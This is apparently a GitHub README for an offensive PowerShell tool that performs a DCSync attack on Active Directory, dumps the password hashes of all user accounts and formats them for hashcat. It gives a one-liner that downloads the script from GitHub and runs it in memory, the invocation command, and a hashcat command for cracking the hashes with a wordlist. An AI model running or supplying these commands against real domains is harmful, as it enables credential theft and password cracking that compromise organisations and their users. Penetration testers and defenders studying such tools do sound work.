# DCSync-To-hashcat
Performs DCSync and extracts all user accounts hashes in a hashcat friendly format

### Execute from GitHub:
```
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/The-Viper-One/DCSync-To-Hashcat/main/DCSync-To-Hashcat.ps1)Invoke-DCSynTH
```
### Execute after loading into memory:
```
Invoke-DCSynTH
```

![image](https://user-images.githubusercontent.com/68926315/222810926-7b0c6bfd-e93b-42bc-95c4-877bb6b31a81.png)

### hashcat cracking

The results can be copied over to file and run againt Hashcat
```
hashcat -a 0 -m 1000 hashes.txt Wordlists/rockyou2021.txt
```
